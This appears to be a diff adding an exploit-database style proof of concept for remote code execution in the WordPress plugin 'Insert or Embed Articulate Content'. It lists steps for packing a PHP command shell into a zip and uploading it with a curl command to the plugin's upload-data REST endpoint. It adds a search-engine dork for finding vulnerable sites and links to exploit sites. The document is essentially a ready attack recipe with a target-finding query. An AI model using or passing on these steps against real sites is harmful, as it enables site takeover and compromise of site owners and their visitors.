@@ -1,0 +1,18 @@
+WordPress Plugin Insert or Embed Articulate Content into WordPress Remote Code Execution
+
+POC :
+
+[-] go to site/index.php/wp-json/articulate/v1/upload-data
+[-] input file index.html and index.php on zip file
+[-] u input blank on index.html and u input command shell on index.php
+[-] curl site/index.php/wp-json/articulate/v1/upload-data -F "name=urzip.zip" -F "chunk={RANDOM NUMBER}" -F "chunks={RANDOM NUMBER}" -F "file=@urzip.zip"
+
+DORK :
+inurl:/wp-content/plugins/insert-or-embed-articulate/
+
+SS:
+https://khunerable.net/images/wordpress.jpg
+
+REFERENCE :
+https://cxsecurity.com/issue/WLB-2019060137
+https://www.exploitkita.org/2019/06/wordpress-plugin-insert-or-embed.html
